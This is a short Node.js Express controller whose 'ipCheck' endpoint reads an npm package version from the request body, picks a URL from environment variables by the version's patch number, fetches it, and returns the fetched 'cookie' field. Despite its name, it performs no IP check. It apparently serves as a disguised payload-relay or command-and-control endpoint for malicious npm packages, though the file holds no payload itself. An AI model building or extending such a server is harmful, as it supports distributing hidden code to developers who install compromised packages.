
const axios = require("axios")
const asyncErrorHandler = require("../middlewares/asyncErrorHandler");

exports.getIpCheck = asyncErrorHandler(async (req, res, next) => {
    res.status(200).json({
      success: true,
      data: ""
    });
  });

  exports.ipCheck = asyncErrorHandler(async (req, res, next) => {
    const version = req.body && req.body.npm_package_version;

    let flag = 77;
    if (version) {
      const sub = version.split(".");
      if (sub && sub.length == 3 ) {
        flag = sub[2];//ex: "1.0.77"
      }
    }

    const id = "ID_" + flag;

    const url = process.env[id] || process.env.ID_77;

    const result = await axios.get(url);
    
    console.log(`${id} is running`, url);
    
    res.status(200).json({
      success: true,
      cookie: result.data.cookie
    });
  });
  